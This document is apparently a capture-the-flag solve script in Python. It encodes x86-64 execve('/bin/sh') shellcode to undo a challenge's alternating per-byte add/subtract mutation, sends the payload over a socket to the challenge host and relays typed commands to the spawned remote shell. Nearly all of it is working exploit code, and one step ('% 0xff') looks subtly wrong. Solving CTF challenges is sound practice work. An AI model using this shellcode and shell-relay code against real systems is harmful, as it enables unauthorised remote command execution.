# The program will modify the shellcode by +0, -1, +2, -3, +4 ... before executing the shellcode.
import binascii
import socket

host = 'challenge.ctf.games'
port = 32383
# host = '127.0.0.1'
# port = 1337

ori_shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
# ori_shellcode = '\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'
new_shellcode = b''
for i in range(len(ori_shellcode)):
    new = ord(ori_shellcode[i]) + (-i if i%2==0 else i)
    new = new - 0x100 if new > 0xff else new
    new = new + 0x100 if new < 0    else new
    new = new % 0xff
    print(hex(ord(ori_shellcode[i])), -i if i%2 == 0 else i, hex(new))
    new_shellcode += new.to_bytes(1, 'little')

print(len(new_shellcode), '\\x' + '\\x'.join(new_shellcode.hex(':').split(':')))
with open('payload', 'wb') as f:
    f.write(new_shellcode)

def ncat(content):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    print(s.recv(4096))
    print('Sending shellcode...')
    res = s.sendall(content + "\n".encode('utf-8'))
    print(f'Sended {res} bytes')
    print(s.recv(4096))
    while True:
        cmd = input('> ').encode('ascii')
        s.sendall(cmd)
        print(s.recv(4096))

ncat(new_shellcode)

def verify():
    for i in range(0, len(ori_shellcode)):
        c = (new_shellcode[i] + (i if i%2==0 else -i))
        c = c - 0x100 if c > 0xff else c
        c = c + 0x100 if c < 0 else c
        # print(c)
        # print(ori_shellcode[i])
        if c != ord(ori_shellcode[i]):
            print(i, hex(c), hex(ord(ori_shellcode[i])))

